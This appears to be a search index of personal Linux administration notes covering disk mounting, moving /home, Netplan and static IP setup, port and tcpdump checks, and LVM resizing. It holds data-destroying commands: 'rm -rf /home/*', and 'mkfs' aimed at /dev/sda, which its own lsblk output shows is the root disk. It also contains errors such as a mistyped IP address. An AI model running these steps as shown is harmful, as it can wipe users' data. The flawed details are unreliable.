look a bit messy, with some lines appearing twice or several ending in \u201crelease\u201d. The most important line here is \u201cPRETTY_NAME=\u201d, which contains the name of the distribution and version number that you\u2019re currently using.</p> <p>Another command that works on all distributions without the need for a special tool is the following:</p> <pre><code>cat /etc/os-release\n</code></pre> <p>If you only need the name and version number of your current distribution, the following command will suffice:</p> <pre><code>lsb_release -d\n</code></pre>"},{"location":"Linux/linuxVersion/#cpu-stats","title":"CPU Stats","text":"<pre><code>uname -a\n\nlscpu\n</code></pre>"},{"location":"Linux/mountDisk/","title":"mountDisk","text":""},{"location":"Linux/mountDisk/#steps-to-mount-disk-or-partition-in-linux","title":"Steps to mount disk or partition in Linux:","text":"<ol> <li> <p>Launch terminal.</p> </li> <li> <p>Get disk or partition name that you want to mount.</p> </li> </ol> <p><code>$ lsblk    NAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT    loop0    7:0    0  55.4M  1 loop /snap/core18/1944    loop1    7:1    0  55.4M  1 loop /snap/core18/1932    loop2    7:2    0 217.9M  1 loop /snap/gnome-3-34-1804/60    loop3    7:3    0   219M  1 loop /snap/gnome-3-34-1804/66    loop4    7:4    0  64.8M  1 loop /snap/gtk-common-themes/1514    loop5    7:5    0    51M  1 loop /snap/snap-store/518    loop6    7:6    0  62.1M  1 loop /snap/gtk-common-themes/1506    loop7    7:7    0    51M  1 loop /snap/snap-store/498    loop8    7:8    0  31.1M  1 loop /snap/snapd/10707    loop9    7:9    0  31.1M  1 loop /snap/snapd/10492    sda      8:0    0    20G  0 disk     \u251c\u2500sda1   8:1    0     1M  0 part     \u251c\u2500sda2   8:2    0   513M  0 part /boot/efi    \u2514\u2500sda3   8:3    0  19.5G  0 part /    sdb      8:16   0    20G  0 disk     \u2514\u2500sdb1   8:17   0    20G  0 part     sr0     11:0    1  1024M  0 rom</code></p> <ol> <li>Check filesystem type of the disk or partition.</li> </ol> <p><code>$ blkid /dev/sdb1    /dev/sdb1: UUID=\"ccab0f8d-3b5b-4189-9da3-23c49159c318\" BLOCK_SIZE=\"4096\" TYPE=\"ext4\" PARTUUID=\"c088a647-01\"</code></p> <ol> <li> <p>Format disk in ext4 <code>sudo mkfs -t ext4 /dev/sda</code></p> </li> <li> <p>Check filesystem type of the disk or partition.</p> </li> </ol> <p><code>$ blkid /dev/sda 2/dev/sda: UUID=\"ccab0f8d-3b5b-4189-9da3-23c49159c318\" BLOCK_SIZE=\"4096\" TYPE=\"ext4\" PARTUUID=\"c088</code></p> <ol> <li>Create a directory for mount point if it doesn't already exist.</li> </ol> <p><code>$ mkdir disk</code></p> <ol> <li>Manually mount partition using mount.</li> </ol> <p><code>$ sudo mount -t ext4 /dev/sdb1 disk    [sudo] password for user:</code></p> <ol> <li>Check if drive was successfully mounted.</li> </ol> <p><code>$ df -h    Filesystem      Size  Used Avail Use% Mounted on    tmpfs           391M  1.8M  389M   1% /run    /dev/sda3        20G  7.1G   12G  39% /    tmpfs           2.0G     0  2.0G   0% /dev/shm    tmpfs           5.0M     0  5.0M   0% /run/lock    tmpfs           4.0M     0  4.0M   0% /sys/fs/cgroup    /dev/sda2       512M  7.8M  505M   2% /boot/efi    tmpfs           391M  112K  391M   1% /run/user/1000    /dev/sdb1        20G   45M   19G   1% /home/user/disk</code></p> <ol> <li>Unmount previously mounted drive.</li> </ol> <p><code>$ sudo umount /dev/sdb1</code></p> <ol> <li>Open /etc/fstab using your preferred text editor.</li> </ol> <p><code>$ sudo vi /etc/fstab</code></p> <ol> <li> <p>Add an entry for a new mount point.</p> <p><code>/dev/sdb1       /home/user/disk ext4    defaults        0       2</code></p> </li> <li> <p>Mount all filesystems in /etc/fstab.</p> <p><code>$ sudo mount -a</code></p> </li> <li> <p>Check if drive or filesystem is mounted successfully.</p> <p><code>$ df -h Filesystem      Size  Used Avail Use% Mounted on tmpfs           391M  1.8M  389M   1% /run /dev/sda3        20G  7.1G   12G  39% / tmpfs           2.0G     0  2.0G   0% /dev/shm tmpfs           5.0M     0  5.0M   0% /run/lock tmpfs           4.0M     0  4.0M   0% /sys/fs/cgroup /dev/sda2       512M  7.8M  505M   2% /boot/efi tmpfs           391M  112K  391M   1% /run/user/1000 /dev/sdb1        20G   45M   19G   1% /home/user/disk</code></p> </li> </ol>"},{"location":"Linux/mountDiskBusy/","title":"How to Move Home Directory to New Partition or Disk in Linux","text":"<p>Aaron KiliJuly 4, 2017 CategoriesLinux Tutorials 68 Comments</p> <p>On any Linux system, one of the directories that will surely grow in size has to be the <code>/home</code> directory. This is because system accounts (users) directories will reside in /home except root account \u2013 here users will continuously store documents and other files.</p> <p>Another important directory with the same behavior is <code>/var</code>, it contains log files whose size will gradually increase as the system continues to run such as log files, web files, print spool files etc.</p> <p>When these directories fill up, this can cause critical problems on the root file system resulting into system boot failure or some other related issues. However, sometimes you can only notice this after installing your system and configuring all directories on the root file system/partition.</p> <p>Suggested Read: Linux Directory Structure and Important Files Paths Explained</p> <p>In this guide, we will show how to move the home directory into a dedicated partition possibly on a new storage disk in Linux.</p>"},{"location":"Linux/mountDiskBusy/#installing-and-partitioning-a-new-hard-disk-in-linux","title":"Installing and Partitioning a New Hard Disk in Linux","text":"<p>Before we proceed any further, we\u2019ll briefly explain how to add a new hard disk to an existing Linux server.</p> <p>Note: If you already have a partition ready for the operation, move to the section which explains the steps for moving <code>/home</code> directory in a partition of its own below.</p> <p>We\u2019ll assume you have attached the new disk to the system. On a hard disk, the number of partitions to be created as well as the partition table is normally determined by disk label type and the first few bytes of space will define the MBR (Master Boot Record) which stores the partition table as well as the boot loader (for bootable disks).</p> <p>Although there are many label types, Linux only accepts two: MSDOS MBR (516 bytes in size) or GPT (GUID Partition Table) MBR.</p> <p>Let\u2019s also assume that the new new hard disk (/dev/sdb of size 270 GB used for the purpose of this guide, you probably need a bigger capacity on a server for large user base.</p> <p>First you need to set the disk label type using fdisk or parted; we have used GPT label name in this example.</p> <pre><code># parted /dev/sdb mklabel gpt\n</code></pre> <p>Note: fdisk only supports MSDOS MBR for now and parted supports both labels.</p> <p>Now create the first partition (/dev/sdb1) with size 106GB. We have reserved 1024MB of space for the MBR.</p> <pre><code># parted -a cylinder /dev/sdb mkpart primary 1074MB 107GB\n</code></pre> <p>Explaining the command above:</p> <ul> <li>a \u2013 option to specify the partition alignment.</li> <li>mkpart \u2013 sub command to create the partition.</li> <li>primary \u2013 sets partition type as primary on the hard disk (other values are logical or extended).</li> <li>1074MB \u2013 beginning of partition.</li> <li>107GB \u2013 end of partition.</li> </ul> <p>Now check the free space on the disk as follows.</p> <pre><code># parted /dev/sdb print free\n</code></pre> <p>We will create another partition (/dev/sdb2) with size 154GB.</p> <pre><code># parted -a cylinder /dev/sdb mkpart primary 115GB 268GB\n</code></pre> <p>Next, let\u2019s set the filesystem type on each partition.</p> <pre><code># mkfs.ext4 /dev/sdb1\n# mkfs.xfs /dev/sdb2\n</code></pre> <p>To view all storage devices attached on the system, type.</p> <pre><code># parted -l\n</code></pre> <p>List New Storage Device</p>"},{"location":"Linux/mountDiskBusy/#moving-home-directory-into-a-dedicated-partition","title":"Moving Home Directory into a Dedicated Partition","text":"<p>Now we have added the new disk and created the necessary partition; it\u2019s now time to move the home folder into one of the partitions. To use a fileysystem, it has to be mounted to the root filesystem at a mount point: the target directory such as /home.</p> <p>First list the filesystem usage using df command on the system.</p> <pre><code># df -l\n</code></pre> <p>Linux Filesystem Usage</p> <p>We will start by creating a new directory /srv/home where we can mount /dev/sdb1 for the time being.</p> <pre><code># mkdir -p /srv/home\n# mount /dev/sdb1 /srv/home \n</code></pre> <p>Then move the content of /home into /srv/home (so they will be practically stored in /dev/sdb1) using rsync command or cp command.</p> <pre><code># rsync -av /home/* /srv/home/\nOR\n# cp -aR /home/* /srv/home/\n</code></pre> <p>After that, we will find the difference between the two directories using the diff tool, if all is well, continue to the next step.</p> <pre><code># diff -r /home /srv/home\n</code></pre> <p>Afterwards, delete all the old content in the /home as follows.</p> <pre><code># rm -rf /home/*\nor\n# rm -rvf /home/*\n</code></pre> <p>Next unmount /srv/home.</p> <pre><code># umount /srv/home\n</code></pre> <p>Finally, we have to mount the filesystem /dev/sdb1 to /home for the mean time.</p> <pre><code># mount /dev/sdb1 /home\n# ls -l /home\n</code></pre> <p>The above changes will last only for the current boot, add the line below in the /etc/fstab to make the changes permanent.</p> <p>Use following command to get the partition UUID.</p> <pre><code># blkid /dev/sdb1\n\n/dev/sdb1: UUID=\"e087e709-20f9-42a4-a4dc-d74544c490a6\" TYPE=\"ext4\" PARTLABEL=\"primary\" PARTUUID=\"52d77e5c-0b20-4a68-ada4-881851b2ca99\"\n</code></pre> <p>Once you know the partition UUID, open /etc/fstab file add following line.</p> <pre><code>UUID=e087e709-20f9-42a4-a4dc-d74544c490a6   /home   ext4   defaults   0   2\n</code></pre> <p>Explaining the field in the line above:</p> <ul> <li>UUID \u2013 specifies the block device, you can alternatively use the device file /dev/sdb1.</li> <li>/home \u2013 this is the mount point.</li> <li>etx4 \u2013 describes the filesystem type on the device/partition.</li> <li>defaults \u2013 mount options, (here this value means rw, suid, dev, exec, auto, nouser, and async).</li> <li>0 \u2013 used by dump tool, 0 meaning don\u2019t dump if filesystem is not present.</li> <li>2 \u2013 used by fsck tool for discovering filesystem check order, this value means check this device after root filesystem.</li> </ul> <p>Save the file and reboot the system.</p> <p>You can run following command to see that /home directory has been successfully moved into a dedicated partition.</p> <pre><code># df -hl\n</code></pre> <p>Check Filesystem Usage on Linux</p> <p>That\u2019s It for now! To understand more about Linux file-system, read through these guides relating to filesystem management on Linux.</p> <ol> <li>How to Delete User Accounts with Home Directory in Linux</li> <li>What is Ext2, Ext3 &amp; Ext4 and How to Create and Convert Linux File Systems</li> <li>7 Ways to Determine the File System Type in Linux (Ext2, Ext3 or Ext4)</li> <li>How to Mount Remote Linux Filesystem or Directory Using SSHFS Over SSH</li> </ol> <p>In this guide, we explained you how to move the /home directory into a dedicated partition in Linux. You can share any thoughts concerning this article via the comment form below.</p>"},{"location":"Linux/nanotabs/","title":"Nanotabs","text":""},{"location":"Linux/nanotabs/#edit-your-nanorc-file-or-create-it-and-add","title":"Edit your ~/.nanorc file (or create it) and add:","text":"<p>/etc/nanorc</p> <pre><code>set tabsize 4\nset tabstospaces\n</code></pre>"},{"location":"Linux/nanotabs/#link-symbolics","title":"Link Symbolics","text":"<pre><code>ln -s ../site-available/&lt;dsdsds&gt; .\n</code></pre>"},{"location":"Linux/netPlan/","title":"Netplan static IP on Ubuntu configuration","text":"<p>13 May 2023 by Lubos Rendek</p> <p>In this tutorial, we will discuss a netplan static IP configuration on Ubuntu Linux. Netplan allows for straightforward network IP address configuration using human-readable data-serialization language YAML. The article will also discuss a default Netplan network settings and the location of the Netplan configuration file.</p> <p>You have two options when configuring the IP address on your Ubuntu system, and that is either a static IP address or DHCP. A static IP address allows you to manually select your IP address by configuring it on the Linux system, whereas DHCP relies on the router or DHCP server to lease you an IP address \u2013 either a reserved one or the next available one that is currently free, depending on the setup.</p> <p>In this tutorial you will learn how to:</p> <ul> <li>Use netplan to set static IP on Ubuntu Server</li> <li>Configure netplan to set static IP on Ubuntu Server</li> </ul> <p>Netplan static ip on Ubuntu configuration</p>"},{"location":"Linux/netPlan/#software-requirements-and-conventions-used","title":"Software Requirements and Conventions Used","text":"Category Requirements, Conventions or Software Version Used System Any version of Ubuntu Linux system Software Netplan.io Other Privileged access to your Linux system as root or via the <code>sudo</code> command. Conventions # \u2013 requires given linux commands to be executed with root privileges either directly as a root user or by use of <code>sudo</code> command $ \u2013 requires given linux commands to be executed as a regular non-privileged user"},{"location":"Linux/netPlan/#configure-static-ip-address-using-netplan","title":"Configure static IP address using Netplan","text":"<p>Netplan network configuration had been first introduced starting from Ubuntu 18.04, hence Netplan is available to all new Ubuntu from this version and higher. Let\u2019s get started with some basic understating on how netplan works on Ubuntu.</p> <p>Netplan allows network configuration via both: networkd daemon or NetworkManager. networkd daemon is mainly used for server configuration, whereas NetworkManager is used by GUI users. To switch between both you need to specify <code>renderer</code> explicitly via netplan configuration file.</p> <p>NOTE If no <code>renderer</code> is specified within the netplan\u2019s configuration file, then the default handler for the network configuration on this particular device will be networkd daemon.</p> <p>The netplan configuration file location is set to <code>/etc/netplan/</code> directory. Other possible locations are <code>/lib/netplan/</code> and <code>/run/netplan/</code>. Depending on your Ubuntu installation the actual Netplan configuration file can take one of the following three forms:</p> <ul> <li>01-netcfg.yaml</li> <li>01-network-manager-all.yaml</li> <li>50-cloud-init.yaml</li> </ul> <p>In case you cannot find your configuration file, you may attempt to generate the new netplan config by executing the below command:</p> <pre><code>$ sudo netplan generate\n</code></pre> <p>DID YOU KNOW YOU CAN CONFIGURE STATIC IP USING DHCP SERVER? Most likely your current Ubuntu system uses DHCP server to configure its networking settings. Hence, the configuration of your IP address is dynamic. In many scenarios, simply configuring your router or local DHCP server is a preferred way to set a static address to any host regardless of the operating system in use. Check your router manual and assign the static IP address to your host based on its MAC address using the DHCP service.</p>"},{"location":"Linux/netPlan/#netplan-static-ip-step-by-step-instructions","title":"Netplan static ip step by step instructions","text":""},{"location":"Linux/netPlan/#ubuntu-server","title":"Ubuntu Server","text":"<ol> <li>To configure a static IP address on your Ubuntu server you need to find and modify a relevant netplan network configuration file. See the above section for all possible Netplan configuration file locations and forms.For example you might find there a default netplan configuration file called</li> </ol> <p><code>01-netcfg.yaml</code></p> <p>with a following content instructing the</p> <p><code>networkd</code></p> <p>deamon to configure your network interface via DHCP:</p> <p><code># This file describes the network interfaces available on your system    # For more information, see netplan(5).    network:      version: 2      renderer: networkd      ethernets:        enp0s3:          dhcp4: yes</code></p> <ol> <li>To set your network interface</li> </ol> <p><code>enp0s3</code></p> <p>to static IP address</p> <p><code>192.168.1.222</code></p> <p>with gateway</p> <p><code>192.168.1.1</code></p> <p>and DNS server as</p> <p><code>8.8.8.8</code></p> <p>and</p> <p><code>8.8.4.4</code></p> <p>replace the above configuration with the one below.</p> <p>WARNING    You must adhere to a correct code indent for each line of the block. In other words, the number of spaces before each configuration stanza matters. Otherwise you may end up with an error message similar to:**    Invalid YAML at //etc/netplan/01-netcfg.yaml line 7 column 6: did not find expected key**</p> <p><code># This file describes the network interfaces available on your system    # For more information, see netplan(5).    network:      version: 2      renderer: networkd      ethernets:        enp0s3:         dhcp4: no         addresses: [192.168.1.222/24]         gateway4: 192.168.1.1         nameservers:           addresses: [8.8.8.8,8.8.4.4]</code></p> <ol> <li>Once ready apply the new Netplan configuration changes with the following commands:</li> </ol> <p><code>$ sudo netplan apply</code></p> <p>In case you run into some issues execute:</p> <p><code>$ sudo netplan --debug apply</code></p>"},{"location":"Linux/ports/","title":"Ports","text":"<p># Used Ports </p> <pre><code>sudo lsof -i -P -n | grep LISTEN sudo ss -tnlp\n</code></pre> <p>## Monit incoming</p> <p># tcpdump filter for HTTP GET </p> <pre><code>sudo tcpdump -s 0 -A 'tcp[((tcp[12:1] &amp; 0xf0) &gt;&gt; 2):4] = 0x47455420' \n</code></pre> <p># tcpdump filter for HTTP POST  </p> <pre><code>sudo tcpdump -s 0 -A 'tcp dst port 80 and (tcp[((tcp[12:1] &amp; 0xf0) &gt;&gt; 2):4] = 0x504f5354)'\n</code></pre> <p># tcpdump filter for POST PORT </p> <pre><code>tcpdump -s 0 -A 'tcp dst port 3000 and (tcp[((tcp[12:1] &amp; 0xf0) &gt;&gt; 2):4] = 0x504f5354)'\n</code></pre> <p># tcpdump filter for GET PORT </p> <pre><code>tcpdump -s 0 -A 'tcp dst port 3003 and (tcp[((tcp[12:1] &amp; 0xf0) &gt;&gt; 2):4] = 0x47455420)'\n</code></pre> <pre><code>kill -9 $(sudo lsof -i -P -n | grep nginx)\n</code></pre> <pre><code>sudo netstat -tupln\n</code></pre> <pre><code>sudo lsof -i -P -n\n</code></pre> <pre><code>python -m SimpleHTTPServer 8000 &amp;&gt; /dev/null &amp; pid=$!\n</code></pre>"},{"location":"Linux/procmon/","title":"Procmon","text":"<pre><code>IFS=$'\\n'\n\nold_process=$(ps -eo command)\n\nwhile true; do\n  new_process=$(ps -eo command)\n  diff &lt;(echo \"$old_process\") &lt;(echo \"$new_process\") |grep [\\&lt;\\&gt;]\n  sleep 1\n  old_process=$new_process\ndone\n</code></pre>"},{"location":"Linux/resize/","title":"Redimensionar discos duros de Servidores Cloud en Linux sin reinicios","text":"<p>Como coment\u00e1bamos en nuestro post anterior, en el que utiliz\u00e1bamos la aplicaci\u00f3n Gparted para que Linux interpretara el redimensionamiento de discos duros realizado desde Cloudbuilder Next, si queremos prescindir de reiniciar el servidor para que su nueva capacidad est\u00e9 operativa, necesitamos emplear algo de c\u00f3digo. En este art\u00edculo, explicamos c\u00f3mo hacerlo con las distribuciones Ubuntu y CentOS y te recordamos el proceso en Windows para redimensionar los discos duros de los Servidores Cloud.</p> <p>Antes de seguir avanzando y meternos con el c\u00f3digo, te recordamos que el primer paso es modificar la capacidad del almacenamiento del Servidor desde el Panel de Control de Cloudbuilder Next.</p> <p>A continuaci\u00f3n, explicamos c\u00f3mo conseguir que el sistema operativo Linux interprete el nuevo tama\u00f1o asignado al disco duro sin reiniciar los servidores. Esta opci\u00f3n es m\u00e1s compleja ya que hay que ejecutar una serie de comandos, conectados por SSH al servidor en cuesti\u00f3n, as\u00ed que vamos a describir todo este proceso por medio de una serie de comandos en las distribuciones Ubuntu y CentOS. Sin embargo, es importante darse cuenta que en los casos particulares de cada m\u00e1quina puedan cambiar nombres de discos y vol\u00famenes.</p> <p>Tabla de contenidos</p> <p>1 Redimensionar discos duros en Ubuntu</p> <p>2 Redimensionar particiones en CentOS</p>"},{"location":"Linux/resize/#redimensionar-discos-duros-en-ubuntu","title":"Redimensionar discos duros en Ubuntu","text":"<p>Vamos a comenzar viendo la secuencia de comandos de consola que nos permitir\u00e1 reorganizar las particiones en una distribuci\u00f3n Ubuntu:</p> <p>Comprobamos el identificador del disco usando el comando:</p> <pre><code>ls /sys/class/scsi_disk/\n</code></pre> <p>Ser\u00e1 algo como 2:0:0:0, 3:0:0:0, 4:0:0:0. La salida la podemos ver en la siguiente imagen.</p> <p></p> <p>Hacemos un escaneo del disco, usando ese identificador:</p> <pre><code>echo 1 &gt; /sys/class/scsi_device/4:0:0:0/device/rescan\n</code></pre> <p>En el comando anterior, ten cuenta que probablemente necesitar\u00e1s cambiar el identificador 4:0:0:0 por el que te haya aparecido al hacer ls /sys/class/scsi_disk/.</p> <p>Ahora vamos a hacer un an\u00e1lisis para comprobar discos, particiones y tama\u00f1os. Esto se consigue con fdisk.</p> <pre><code>fdisk -l\n</code></pre> <p>Deber\u00edamos observar que el tama\u00f1o de los discos ya se han actualizado y qu\u00e9 particiones tenemos creadas en este momento, junto con sus dimensiones.</p> <p>Ahora vamos a crear una partici\u00f3n con el espacio no particionado que se ha generado en el disco como consecuencia de la redimensi\u00f3n. Para ello, lanzamos el comando:</p> <pre><code>fdisk /dev/sda\n</code></pre> <p>Este comando nos abre una interfaz de men\u00fa capaz de recibir varias instrucciones para administrar las particiones. Tenemos que ir introduciendo uno a uno las distintas opciones de men\u00fa por medio de su inicial. Ser\u00e1n las siguientes:</p> <ul> <li>n # Nueva partici\u00f3n.</li> <li>p # Primaria.</li> <li>3 # N\u00famero de la partici\u00f3n.</li> <li>***Enter #*** Primer sector, por defecto el primero libre.</li> <li>Enter # \u00daltimo sector, por defecto el \u00faltimo del disco.</li> <li>***w #** E*scribir cambios.</li> </ul> <p></p> <p>Una vez creada esta partici\u00f3n, tenemos que marcarla como tipo Linux LVM.</p> <p>Tenemos que volver a lanzar el men\u00fa anterior con el comando:</p> <pre><code>fdisk /dev/sda\n</code></pre> <p>Y vamos usando las siguientes opciones de men\u00fa:</p> <ul> <li>***t #***Cambiar tipo de partici\u00f3n.</li> <li>3 # N\u00famero de partici\u00f3n.</li> <li>8e # Tipo LVM.</li> <li>w # Escribir cambios.</li> </ul> <p></p> <p>El siguiente paso consiste en escanear las particiones de disco para detectar los cambios.</p> <pre><code>apt update -yy\napt install -yy parted\npartprobe /dev/sda\n</code></pre> <p> Ahora usaremos LVM, primero creando el volumen f\u00edsico.</p> <pre><code>pvcreate /dev/sda3\n</code></pre> <p>Luego a\u00f1adimos este volumen al grupo de vol\u00famenes, en este caso se llama vg00.</p> <pre><code>vgextend vg00 /dev/sda3\n</code></pre> <p>Redimensionamos el volumen l\u00f3gico, vg00-lv01 en este caso, para ocupar todo el espacio libre.</p> <pre><code>lvextend -l +100%FREE /dev/mapper/vg00-lv01\n</code></pre> <p>Acabamos redimensionando el sistema de ficheros del volumen l\u00f3gico.</p> <pre><code>resize2fs /dev/mapper/vg00-lv01\n</code></pre> <p>Esta secuencia de comandos se puede ver resumida en la siguiente imagen:Solo nos queda comprobar el estado de las particiones del disco, para ver c\u00f3mo ha quedado nuestra configuraci\u00f3n. Podemos hacerlo mediante el comando que ya conocemos:</p> <pre><code>fdisk -l\n</code></pre> <p></p>"},{"location":"Linux/resize/#redimensionar-particiones-en-centos","title":"Redimensionar particiones en CentOS","text":"<p>Ahora vamos a repetir toda esta secuencia de comandos sobre una distribuci\u00f3n CentOS. El proceso es muy similar al que hemos se\u00f1alado para Ubuntu, con algunas peque\u00f1as modificaciones. Lo m\u00e1s importante es fijarse en la salida de los comandos para saber cu\u00e1les son los discos que tenemos actualmente, sus nombres, particiones, etc., de modo que podamos personalizar las instrucciones a nuestro caso particular.</p> <p>Como el proceso es pr\u00e1cticamente el mismo que para Ubuntu, vamos a resumir los pasos haciendo mayor hincapi\u00e9 en las diferencias que nos podemos encontrar entre uno y otro sistema.</p> <p>El primer paso es comprobar el identificador del disco.</p> <pre><code>ls /sys/class/scsi_disk/\n</code></pre> <p> Como puedes ver en la imagen, en nuestro caso es 2:0:0:0.</p> <p>Hacemos un escaneo del disco, usando ese identificador:</p> <pre><code>echo 1 &gt; /sys/class/scsi_device/2:0:0:0/device/rescan\n</code></pre> <p>Ejecutamos el an\u00e1lisis de particiones, del mismo modo que en Ubuntu, con fdisk.</p> <pre><code>fdisk -l\n</code></pre> <p> En la parte de arriba vemos que los discos ya tienen el tama\u00f1o que hemos asignado en el panel de control de Cloud Builder. Sin embargo, la partici\u00f3n principal todav\u00eda tiene el tama\u00f1o antiguo.</p> <p>Creamos una partici\u00f3n con el espacio no particionado:</p> <pre><code>fdisk /dev/sda\n</code></pre> <p>Todo el proceso de creaci\u00f3n de estas particiones es el mismo que el explicado m\u00e1s arriba para Ubuntu. En resumen, los comandos que se necesita ir indicando son los siguientes:</p> <ul> <li>n # Nueva partici\u00f3n.</li> <li>***p #*** Primaria.</li> <li>3 # N\u00famero de la partici\u00f3n.</li> <li>Enter # Primer sector, por defecto el primero libre.</li> <li>Enter # \u00daltimo sector, por defecto el \u00faltimo del disco.</li> <li>w # Escribir cambios.</li> </ul> <p>Ahora debemos lanzar de nuevo este proceso para marcar la partici\u00f3n como tipo Linux LVM.</p> <pre><code>fdisk /dev/sda\n</code></pre> <p>Introducimos las siguientes opciones de men\u00fa:</p> <ul> <li>t # Cambiar tipo de partici\u00f3n.</li> <li>3 # N\u00famero de partici\u00f3n.</li> <li>8e # Tipo LVM.</li> <li>w # Escribir cambios.</li> </ul> <p>Para el paso de escanear las particiones de disco, con objetivo de detectar los cambios, CentOS ya viene con el programa Parted instalado, as\u00ed que simplemente tenemos que hacer lo siguiente:</p> <pre><code>partprobe /dev/sda\n</code></pre> <p>Recuerda que, si este comando no est\u00e1 disponible, probablemente lo tengas que instalar usando Yum: yum install parted.</p> <p>Ahora usaremos LVM, primero creando el volumen f\u00edsico.</p> <pre><code>pvcreate /dev/sda3\n</code></pre> <p>Ahora a\u00f1adimos este volumen al grupo de vol\u00famenes. Para este caso te tienes que fijar especialmente en el nombre del volumen, que pudimos ver con fdisk -l. En nuestra m\u00e1quina se llama centos, tal y como aparece marcado en la siguiente imagen.As\u00ed que escribimos:</p> <pre><code>vgextend centos /dev/sda3\n</code></pre> <p> Estamos terminando. Pero antes debemos redimensionar el volumen l\u00f3gico, centos-root en este caso, para ocupar todo el espacio libre.</p> <pre><code>lvextend -l +100%FREE /dev/mapper/centos-root\n</code></pre> <p></p> <p>Redimensionamos el volumen l\u00f3gico, centos-root en este caso, para ocupar el espacio libre.</p> <pre><code>xfs_growfs /dev/mapper/centos-root\n</code></pre> <p>Terminado el proceso, podemos comprobar el estado de las particiones del disco, usando de nuevo el comando fdisk.</p> <pre><code>fdisk -l\n</code></pre> <p>El resultado que encontraremos ser\u00e1 similar al de la imagen siguiente, donde se puede comprobar que la partici\u00f3n principal tiene el tama\u00f1o del disco, una vez agregado el nuevo espacio asignado.</p> <p></p>"},{"location":"Linux/staticIpLinux/","title":"How to Set Static IP Address and Configure Network in Linux","text":"<p>Marin TodorovLast Updated: July 13, 2023 CategoriesLinux Commands 32 Comments</p> <p>If you are a Linux system administrator, time will come when you will need to configure networking on your system. Unlike desktop machines where you can use dynamic IP addresses, on a server infrastructure, you will need to setup a static IP address (at least in most cases).</p> <p>Read Also: How to Set or Change System Hostname in Linux&lt;/p</p> <p>This article is meant to show you how to configure static IP address on most frequently used Linux distributions.</p> <p>For the purpose of this tutorial, we will use the following Internet Protocol version 4 (IPv4) details:</p> <pre><code>IP address: 192.168.0.100\nNetmask: 255.255.255.0\nHostname: node01.tecmint.com\nDomain name: tecmint.com\nGateway: 192.168.0.1\nDNS Server 1: 8.8.8.8\nDNS Server 2: 4.4.4.4\n</code></pre>"},{"location":"Linux/staticIpLinux/#configure-static-ip-address-in-rhelcentosfedora","title":"Configure Static IP Address in RHEL/CentOS/Fedora:","text":"<p>To configure static IP address in RHEL / CentOS / Fedora, you will need to edit:</p> <pre><code>/etc/sysconfig/network\n/etc/sysconfig/network-scripts/ifcfg-eth0\n</code></pre> <p>Where in the above <code>\"ifcfg-eth0\"</code> answers to your network interface <code>eth0</code>. If your interface is named \u201c<code>eth1\"</code> then the file that you will need to edit is <code>\"ifcfg-eth1\"</code>.</p> <p>Let\u2019s start with the first file:</p> <pre><code># vi /etc/sysconfig/network\n</code></pre> <p>Open that file and set:</p> <pre><code>NETWORKING=yes\nHOSTNAME=node01.tecmint.com\nGATEWAY=192.168.0.1\nNETWORKING_IPV6=no\nIPV6INIT=no\n</code></pre> <p>Next open:</p> <pre><code># vi /etc/sysconfig/network-scripts/ifcfg-eth0\n</code></pre> <p>Note: Make sure to open the file corresponding to your network interface. You can find your network interface name with ifconfig -a command.</p> <p>In that file make the following changes:</p> <pre><code>DEVICE=\"eth0\"\nBOOTPROTO=\"static\"\nDNS1=\"8.8.8.8\"\nDNS2=\"4.4.4.4\"\nGATEWAY=\"192.168.0.1\"\nHOSTNAME=\"node01.tecmint.com\"\nHWADDR=\"00:19:99:A4:46:AB\"\nIPADDR=\"192.68.0.100\"\nNETMASK=\"255.255.255.0\"\nNM_CONTROLLED=\"yes\"\nONBOOT=\"yes\"\nTYPE=\"Ethernet\"\nUUID=\"8105c095-799b-4f5a-a445-c6d7c3681f07\"\n</code></pre> <p>You will only need to edit the settings for:</p> <ol> <li>DNS1 and DNS2</li> <li>GATEWAY</li> <li>HOSTNAME</li> <li>NETMASK</li> <li>IPADDR</li> </ol> <p>Other settings should have already been predefined.</p> <p>Next edit <code>resolve.conf</code> file by opening it with a text editor such as nano or vi:</p> <pre><code># vi /etc/resolv.conf\nnameserver 8.8.8.8 # Replace with your nameserver ip\nnameserver 4.4.4.4 # Replace with your nameserver ip\n</code></pre> <p>Once you have made your changes restart the networking with:</p> <pre><code># /etc/init.d/network restart  [On SysVinit]\n# systemctl restart network    [On SystemD]\n</code></pre>"},{"location":"Linux/staticIpLinux/#set-static-ip-address-in-debian-ubuntu","title":"Set Static IP Address in Debian / Ubuntu","text":"<p>To setup static IP address in Debian/ Ubuntu, open the following file:</p> <pre><code># nano /etc/network/interfaces\n</code></pre> <p>You may see a line looking like this:</p> <pre><code>auto eth0\niface eth0 inet dhcp\n</code></pre> <p>Change it so it looks like this:</p> <pre><code>auto eth0\niface eth0 inet static \n  address 192.168.0.100\n  netmask 255.255.255.0\n  gateway 192.168.0.1\n  dns-nameservers 4.4.4.4\n  dns-nameservers 8.8.8.8\n</code></pre> <p>Save the file and then edit <code>/etc/resolv.conf</code> like this:</p> <pre><code># nano /etc/resolv.conf\nnameserver 8.8.8.8 # Replace with your nameserver ip\nnameserver 4.4.4.4 # Replace with your nameserver ip\n</code></pre> <p>Restart the networking on your system with:</p> <pre><code># /etc/init.d/network restart  [On SysVinit]\n# systemctl restart network    [On SystemD]\n</code></pre> <p>Your static IP address has been configured.</p>"},{"location":"Linux/staticIpLinux/#conclusion","title":"Conclusion:","text":"<p>You now know how to configure a static IP address on a Linux distro. If you have any questions or comments, please do not hesitate to submit them in the comment section below.</p>"},{"location":"Linux/staticNetworkip/","title":"Configure Ubuntu WiFi Adapter with Netplan","text":"<p>#linux#ubuntu</p>"},{"location":"Linux/staticNetworkip/#ubuntu-networking-with-netplan-2-part-series","title":"Ubuntu Networking with Netplan (2 Part Series)","text":"<p>1Configure Ubuntu Networking with Netplan2Configure Ubuntu WiFi Adapter with Netplan</p> <p>\ud83d\udc49 Here's a short explanation of how to configure an Ubuntu machine to join a wireless network, with Netplan. \ud83d\udc49 This is for a wireless network with WPA2 Personal authentication (you need a password). \ud83d\udc49 My test machine is running Ubuntu desktop 21.04.</p>"},{"location":"Linux/staticNetworkip/#1-gather-required-details","title":"1. Gather Required Details","text":"<ol> <li> <p>Get the wireless network details.    This is WPA2 Personal, you're going to need the usual details:</p> </li> <li> <p>SSID</p> </li> <li> <p>Wireless network password</p> </li> <li> <p>Get your Ubuntu machine's wireless adapter name.    You can use <code>ip link</code> or <code>ip add</code> for this.</p> </li> </ol> <p><code>joe@ub1:~$ ip add    ...    3: 